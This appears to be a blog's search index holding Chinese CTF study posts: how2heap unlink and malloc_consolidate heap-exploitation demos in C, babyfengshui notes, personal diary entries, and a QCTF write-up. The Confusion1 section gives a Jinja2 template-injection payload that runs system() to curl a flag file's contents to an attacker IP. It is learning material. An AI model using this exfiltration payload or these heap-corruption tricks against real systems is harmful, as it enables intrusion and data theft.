<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[unlink | 记录]]></title>
      <url>/2019/03/17/unlink-%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<p>学习全靠宋师傅帮助, 宋师傅tql, 我好菜啊</p>
<p>how2heap的例子, 去掉了printf..就是下面的</p>
<p>就是喜闻乐见的chunk0溢出, 修改chunk1的size里的in_use, 以及prevsize, 然后再free chunk1的时候chunk0就会惨遭unlink</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>


uint64_t <span class="token operator">*</span>chunk0_ptr<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    <span class="token keyword">int</span> malloc_size <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//we want to be big enough not to use fastbins</span>
    <span class="token keyword">int</span> header_size <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>


    chunk0_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chunk0</span>
    uint64_t <span class="token operator">*</span>chunk1_ptr  <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chunk1</span>

    chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">/*
    chunk0_ptr[0] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);
    chunk0_ptr[1] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);
    */</span>

    uint64_t <span class="token operator">*</span>chunk1_hdr <span class="token operator">=</span> chunk1_ptr <span class="token operator">-</span> header_size<span class="token punctuation">;</span>

    chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> malloc_size<span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//    chunk1_hdr[0] = malloc_size + 0x10;</span>

    chunk1_hdr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token keyword">char</span> victim_string<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>victim_string<span class="token punctuation">,</span><span class="token string">"Hello!~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    chunk0_ptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span> victim_string<span class="token punctuation">;</span>

    chunk0_ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414142424242LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个注释吧,是我加的…我开始想第一个问题就是</p>
<p>在伪造fake chunk的时候为什么不能换成注释这种…</p>
<p>这样子为什么不可以呢</p>
<pre><code>----------- &lt;---- fake_chunk
prevsize
----------
size
----------
fake_fd
----------
fake_bk
----------
....
----------
</code></pre><p>为什么要给chunk0的<code>fake_size</code>和<code>fake_prevsize</code>留位置</p>
<pre><code>----------- 
prevsize
----------
size
----------&lt;---- fake_chunk
fake_prev
----------
fake_size
----------
fake_fd
----------
fake_bk
----------
....
----------
</code></pre><p>是因为题目中一般都是</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span> something_list<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

something_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// chunk0</span>
something_list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// chunk1</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以一般只能找到指向chunk的data的指针, 但很难找到指向chunk头部的指针, 所以要从头开始构造<br>比如这个<code>something_list[0]</code>就是指向chunk0的data字段的….所以只能从这里开始伪造一个完整的fake_chunk</p>
<p>第二个问题, 就是既然要从头伪造, 为什么这里没有给<code>chunk0_ptr[0]</code>和<code>chunk1_ptr[1]</code>赋值呢<br>本来给fake_chunk的size赋值是为了过这个check</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != (next_chunk(P))->prev_size, 0))      \
      malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);  \
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>但这里都是0, 所以相当于</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>
<span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">=</span> P <span class="token comment" spellcheck="true">// 由于size字段是0...所以找到的next_chunk还是自己</span>
<span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span>prev_size <span class="token operator">=</span> P <span class="token operator">-></span>prev_size
<span class="token comment" spellcheck="true">// 所以相当于比较了P自己的prev_size和自己的size, 真好, 都是0</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>wo好菜啊, 我要加油, 宋师傅tql</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[heap | malloc consolidate]]></title>
      <url>/2019/03/15/heap-malloc-consolidate/</url>
      <content type="html"><![CDATA[<p>起初完全不懂…<br>看了源代码, 笔记记在了0ctf2017-babyheap里<br>就大概是<code>_int_malloc</code>里</p>
<ol>
<li>请求的大小是large bin的时候, 常见</li>
<li>要用到top chunk, 但发现top chunk不够大了, (不太常见, 得多勤快</li>
</ol>
<p>然后看到ctf-wiki对house_of_rabbit的讲解这个poc1<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_rabbit/" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_rabbit/</a></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span> chunk1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x602000</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span> chunk2<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x602050</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//    chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里<code>chunk1[-1]=0xa1</code>赋值的这里, 如果有这一句, 那么<code>malloc_consolidate</code>之后,fastbin不会被合并</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ heap freed 
FASTBINS<span class="token punctuation">:</span>
UNSORTBINS <span class="token punctuation">:</span> 
bins <span class="token number">8</span> <span class="token punctuation">:</span> 
<span class="token number">0x602050</span> SIZE<span class="token operator">=</span><span class="token number">0x50</span> DATA<span class="token punctuation">[</span><span class="token number">0x602060</span><span class="token punctuation">]</span> <span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">|</span> PREV_INUSE INUSED
bins <span class="token number">18</span> <span class="token punctuation">:</span> 
<span class="token number">0x602000</span> SIZE<span class="token operator">=</span><span class="token number">0xa0</span> DATA<span class="token punctuation">[</span><span class="token number">0x602010</span><span class="token punctuation">]</span> <span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">|</span> PREV_INUSE INUSED
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>达到的目的就是…<code>0x602000</code> overlap掉了 <code>0x602050</code></p>
<p>如果没有这一句,,,就会变成</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ heap freed
FASTBINS<span class="token punctuation">:</span>
UNSORTBINS <span class="token punctuation">:</span> 
bins <span class="token number">18</span> <span class="token punctuation">:</span> 
<span class="token number">0x602000</span> SIZE<span class="token operator">=</span><span class="token number">0xa0</span> DATA<span class="token punctuation">[</span><span class="token number">0x602010</span><span class="token punctuation">]</span> <span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">|</span> PREV_INUSE INUSED
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>两块就变成一块了</p>
<p>所以这个…改掉某一fastbin free块的size…会对其他块在合并的时候造成问题…?</p>
<blockquote>
<p>house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块</p>
</blockquote>
<p>todo: 好好看看malloc_consolidate的代码<br>todo: hose_of_orange<br>todo: house_of_Roman</p>
]]></content>
      
        <categories>
            
            <category> trick </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[33c3 CTF | babyfengshui]]></title>
      <url>/2019/03/12/33c3-CTF-babyfengshui/</url>
      <content type="html"><![CDATA[<p>这题…有一个假设就是<br>省略了读题<br>desc 和 user 是挨着的, 所以设置了验证</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t<span class="token punctuation">)</span> store<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token operator">-></span>desc <span class="token operator">+</span> sz <span class="token operator">>=</span> <span class="token punctuation">(</span>uint32_t<span class="token punctuation">)</span> store<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>而关键就是打破这个假设</p>
<p>直接学了一下wp</p>
<p><a href="http://bruce30262.logdown.com/posts/1256093-33c3-ctf-2016-babyfengshui" target="_blank" rel="external">http://bruce30262.logdown.com/posts/1256093-33c3-ctf-2016-babyfengshui</a></p>
<p>这一篇的wp是. desc是fastbin大小..free掉一个user, 会出现一个fastbin(desc)和一个unsorted(user数据结构,大小0x80), 然后申请一个带有0x80大小的desc的user..由于题目逻辑是先malloc出来的给desc…所以desc就占有了之前user的这块内存</p>
<p>大致先记录一下…回头看,现在先吃饭</p>
<p>还有一种做法</p>
<p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.20_pwn_33c3ctf2016_babyfengshui.html" target="_blank" rel="external">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.20_pwn_33c3ctf2016_babyfengshui.html</a></p>
<p>就是desc是和user同大小0x80…然后删掉一个user…那么由于是smallbin, 所以会合并然后进入到unsorted里…那么下次再申请一个0x100的desc, 就能这个合并过后的分出来了</p>
<p>之后再继续学习</p>
<p>todo: xnuca note</p>
]]></content>
      
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[学期要结束了]]></title>
      <url>/2018/12/16/%E5%AD%A6%E6%9C%9F%E8%A6%81%E7%BB%93%E6%9D%9F%E4%BA%86/</url>
      <content type="html"><![CDATA[<p>忙忙碌碌, 一个学期就要结束了</p>
<p>从开始就知道结果</p>
<p>从来没有过这样的迷茫 这样的累 和 这样的无奈</p>
<p>打破我的一切一切的幻想</p>
<p>感觉现在的我充满了负能量QwQ, 感谢父母感谢身边的朋友</p>
<p>趁现在不需要立即work…来审视一下</p>
<p>orz, 哪天被发现了blog, 看到满屏的吐槽估计就歇了</p>
<p>我大概该把notebook改名成日记本了</p>
<p>或者该再重新搭一个日记本, 记录下平淡无奇的生活, 好留下一点念想</p>
<p>回顾将过去的这几个月, 没有什么值得留恋的人, 地方(太忙了哪里都没去)</p>
<p>喔, 不对…脑子不好使了</p>
<p>好像有, 上周偷偷跑出去一周, 去打了xnuca, 鹏城杯, 中间还穿插着铁三, 但学弟非常想去铁三就让学弟去了</p>
<p>xnuca和鹏城杯都在深圳, 我这学期除了合肥, 南京, 回宣, 应该就只去了深圳吧</p>
<p>emmmmm, 深圳大学真漂亮, 到处透露着富有的气息, xnuca的时候留下印象最深的就是, 就是深大那个xnuca展牌旁边停着的一辆救护车, 第一天结束, 得知第二天5道pwn的时候开玩笑说明天的时候这救护车上就都是自闭的web选手…</p>
<p>结果第二天真的被打自闭了, 除了web/pwn, 其他基本看不懂, 对了, 第一天晚上, 一屋子的web选手打开IDA, 然后问逆向师傅, <code>师傅, 这个 sub_xxxx 是个啥意思啊</code>, 哈哈哈哈哈, 笑死我了… 第二天比赛的时候, 一直没人出这道webpwn…还以为是远程和本地环境不一样…orz, 还是不自信, 等0ops开始拿这题打全场的时候又开始审视这题, 很巧合的发现是网络的问题, 可能是因为多级内网的问题? 要一直打才可能出flag, 然后开始慌忙的打, 但这个时候这题很多队已经被交大打到不能再打了, orz, 太菜了, 又不会修其他题目, 最终被锤到14还是13名, orz, 听闻有几个队已经开始下载游戏了哈哈哈哈哈, 据说网贼快, 主办方还不让我们用网看直播</p>
<p>(据说BOI的pwn整夜没睡真的害怕</p>
<p>xnuca做的很精致, 酒店也很好, 比赛有外网, 自闭的时候可以看动画片, 第一天的环境有几级内网, 第一次玩不太懂, 一直用webshell里的ew, 结果很不稳, 导致只做了第一层, pwn只能提交patch, 不能access到自己的机子, 所以也不能抓流量, 被锤爆完全是因为自己菜</p>
<p>因为没有去北京, 就苟在深圳等鹏城杯了, 本来准备尝一下传说中的早茶, 然而起床就中午了, 收拾东西吃个饭就去鹏城杯签到了</p>
<p>那边修路, 开始没发现, orz, 走了很久被折回来, 等到了鹏城实验室, 都快累死了, 我果然需要每一台轻薄的本子, 立个flag, 出新的LG Gram就买(xnuca的题目里还出现了LG Gram, hhhhh~还给队友普及了一波)</p>
<p>鹏城实验室依然是透露着富有的气息, 但…比赛环境真的是, orz, 跪了</p>
<p>两天AD, 没网, 收手机…</p>
<p>第一天, 靠运气第六了</p>
<p>第二天, 四个pwn, 一个web, 遭不住…不知道该看pwn还是web, 队友在看web..结果一直被打, 我调了调学弟的pwn的exp…调通了打的时候全场大概已经只有7个队能打了…然后学弟告诉我这脚本铁三写的, 当时没打通, orz, 铁三原题…这难道是出题人把题卖给好几个主办方??? 而且这题刚放我还没点开题就被打了…真的是, orz….早知道去打铁三了…打了铁三鹏城杯估计就有奖了, 后面的话才知道我们的俩pwn因为主办方问题没patch上去, 所以一直挨打…从上午打到下午, 然后和客服沟通, 帮我们重启…这下可好了…再也连不上去了….从一直被打, 到down机到结束….这个运维, 算了…有点气</p>
<p>被锤三连…</p>
<p>不过开心的是见了xnianq师傅他们, QwQ, 他们打了我们一上午web, 我打了他们一下午pwn, 因为想了想, 按照赛制, 被打扣分平分, 我不打他们, 他们也会被别人打, 一轮掉分都一样, hhhhh~</p>
<p>和小哥哥, xnianq睡了一晚, 吃了大哥说的潮汕火锅, 长见识了</p>
<p>之后就返程了</p>
<p>然后得知…我逃离的一周, 没被导师发现貌似, 但上课被点名了, orz, 算了, 我早就看开了, 上课也没啥用, 学长说我胆子真大, 哈哈哈哈哈</p>
<p>之后的一周就是两门考试, n个组会, 由于看开了, 考试知道就是随便考了一下, 应该不会挂吧</p>
<p>每周的n次组会和乱七八糟毫无意义的课程, 做不完的项目, 之后就没有什么了</p>
<p>没有时间学习, 甚至开学的比赛都还没复现完, 跪了, 我大概已经废了…只能苟且活着, 最大的愿望就是不被怼</p>
<p>希望来年能对做的事情合理剪枝(<del>疯狂翘课</del>, <del>糊弄项目</del>), 有自己的时间做自己想做的事情</p>
<p>很早就想去看看海, 又不知道和谁, 去哪, 什么时候, 逃多久</p>
<p>喝了一盒真果粒, 吃了面包, 准备睡了, 明天又是工作饱和的一天 (学校超市的真果粒居然和低脂高钙一个价)</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[好久不更blog]]></title>
      <url>/2018/09/12/%E5%A5%BD%E4%B9%85%E4%B8%8D%E6%9B%B4blog/</url>
      <content type="html"><![CDATA[<p>真的是好久不更blog…最近的生活有点迷</p>
<p>还是linux的操作比较流畅, 开心</p>
<p>最近学逆向用了一段时间windows, 给我的感觉是windows上的字体看起来很精细…还有就是我的机子跑windows有点…不流畅, 经常卡顿, 可能是硬件老了吧</p>
<p>开始还准备在windows上搞个ubuntu虚拟机就暂时不用ubuntu了<br>然而…我发现…有点卡, 特别是做kernel pwn的时候, 我又开一个qemu…弹一个新的终端都要卡一下</p>
<p>!!!不过有一个很nice的地方, 就是我的burp在windows下及其的流畅</p>
<p>windows下涉及到请求https的时候, 我的就不是很正常, 可能是某些东西没装上<br>windows下的z3勉强装上, 但angr的依赖搞不定, 我又不会用vs, 就用mingw好像有点问题</p>
<p>wireshark好像也有依赖没装上</p>
<p>本来准备把blog的文件夹打包一遍然后搞到windows下的虚拟机里跑…现在感觉linux这么流畅不太想搞了==</p>
<p>最近大概就做了个tjctf…大部分都是很简单的题目, 有几道没做出来复现报告丢到windows上了…woc…哎</p>
<h2 id="Say-goodbye"><a href="#Say-goodbye" class="headerlink" title="Say goodbye"></a>Say goodbye</h2><p>看了一下上一次更新blog是7-15…早已经没有了印象, 那个时候还是暑假</p>
<p>假期里回老家呆了一段时间, 之后去北京天津玩了几天, 在之后就很焦虑的等待开学了</p>
<p>本来想把出去玩的照片等什么时候整理一下挂到blog上等自己有一天换了电脑换了手机想看的时候再拿出来看看…(本来, 看…真是一个flag, 想了很久都么有行动)</p>
<p>之前每次比赛的照片, 出去玩的照片, 就比如去geekpwn的照片(超喜欢geekpwn的时候拍的照片, 感觉会场超帅气 (也可能是我见识少))</p>
<p>在回家的火车上和同学聊天的场景就好像是昨天, 第一次CTF进决赛, 去参加线下ad仿佛也是昨天, 几年前第一次打程序设计竞赛的时候还憧憬着未来几年ACMer的生活, 大一第一次参加数学建模也还印象深刻, 还有和学长在实验室躲着门卫大爷通宵赶项目</p>
<p>如今, 一起参加比赛, 一起做项目的朋友很多都已经在公司…而我选择了读研究生</p>
<p>当学弟一个一个拿到转正offer的时候, 有一种怅然若失的感觉</p>
<p>当初也有几个朋友放弃保研去工作, 当时很不理解, 当时幻想着我读研究生三年研究自己喜欢的方向, 终于有大把的时间学习安全, 顺便体验一下大学生活, 之后再步入社会</p>
<p>也许我是错的…是不是因为我想着安逸一些才选择继续苟在学校</p>
<p>保研之后的时间我大概一大部分时间花在了做毕业设计上, 关于NAT的一个题目, 现在想起来当时应该换题目…老师给的这题目怎么说…不太靠谱, 还是太年轻, 浪费了很多时间, 当然那段时间看了很多论文, 也导致我刷新了对网络的认识…当时感觉网络的方向很多, 对于一些问题我真的是提不起兴趣来</p>
<p>很久没有和朋友打过比赛…当初的那份热情也随着国内迅速出现的垃圾比赛慢慢消逝</p>
<h2 id="新的生活"><a href="#新的生活" class="headerlink" title="新的生活"></a>新的生活</h2><p>上上周算是开学第一周, 报道, 体检…休息, 周末去买了车…没买到<br>上周是第一周上课, 也叫体验周, 深深地感受到了对英语课的恐惧…我都没听懂老师讲的是啥, 大家连连点头….果然是我太弱了</p>
<p>上周五周六接待了保研面试的学弟学妹, 感觉超开心, 周六回合肥和学弟学妹吃了顿饭, 周日去科大找学长玩了一天, 聊了聊人生…</p>
<h3 id="9-12"><a href="#9-12" class="headerlink" title="9-12"></a>9-12</h3><p>这周已经是周三了, 今晚吃的盒饭…现在就饿了…准备回去吃饭, 洗衣服, 明早再过来</p>
<h3 id="9-13"><a href="#9-13" class="headerlink" title="9-13"></a>9-13</h3><p>今天是周四, 捡一点算法就从今天开始吧, 登上熟悉的oj, 看到上次登录两年前, 有一种emmmmmmm的感觉, 这也许就是菜鸡吧</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[QCTF writeup]]></title>
      <url>/2018/07/15/QCTF-writeup/</url>
      <content type="html"><![CDATA[<p>第一天做了俩2re, 2pwn, 1web然后头疼就睡觉了<br>第二天起来比赛已经结束了..又看了俩Web…和一些逆向<br>虽然都是简单题…但我逆向太差了…做了挺久…而且逆完第二个就不想做了, 太弱了</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>union注入</p>
<h3 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h3><p>弱类型, 购买的时候, 把数字都改成true, true和数字弱类型比较相等, 就会返回猜对了</p>
<h3 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h3><p>有一些过滤, ‘sys’, 管道和反引号好像过滤了, 稍微改一下就OK</p>
<pre><code>http://47.96.118.255:2333/{{config['O'+'SX'].__dict__['sy'+'stem']('curl http://1xx.1xx.xx.xx:7788/$(ca'+'t /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt)')}}
</code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="Xman-babyMips"><a href="#Xman-babyMips" class="headerlink" title="Xman-babyMips"></a>Xman-babyMips</h3><p>丢到jeb里看个大概, 每一位都是独立的, 就爆破一下</p>
<h3 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h3><p>我就是对着代码硬着逆的…不知道大佬怎么逆的</p>
<h3 id="baby-re"><a href="#baby-re" class="headerlink" title="baby-re"></a>baby-re</h3><p>现在看到baby就感觉…这可能是什么奇异的题目, 直觉告诉我…可能不是<code>C/C++</code><br>丢到IDA里看了一下….函数不是一般的多…<br>动态链接还这么多应该就是其他语言或者用了什么框架之类的吧<br>看了看字符串…感觉也许是<code>rust</code>, 我又没学过, 我也很无奈呀</p>
<p>但随手敲一个答案, 连提示都没有…<br>扫到一个函数, 里面有32位, 猜flag是32位的, 试了一下<code>QCTF{AAAAAAAAAAAAAAAAAAAAAAAAAA}</code>, 出了个wrong</p>
<p>艰难的看了一下字符串, 正确应该是<code>correct</code>…但没看到, 然后gdb里search了一下, 看到了原来<code>correct</code>在另一个字符串后面跟着, 喵喵喵?</p>
<p>有些函数没法<code>F5</code>, 报错..<code>call analysis failed</code>…这个时候往往是调用时参数分析不正确, 手动把那个函数参数更改一下, 就OK</p>
<p>那Angr是不是能解决…</p>
<p>这题还开了PIE, 我不会写, 放弃了, 等看flag</p>
<h3 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h3><p>如何反混淆?<br><a href="https://bbs.pediy.com/thread-217727.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-217727.htm</a></p>
<p><a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/112</a><br>这篇文章提到了一个工具..但我用不了, 会报错..</p>
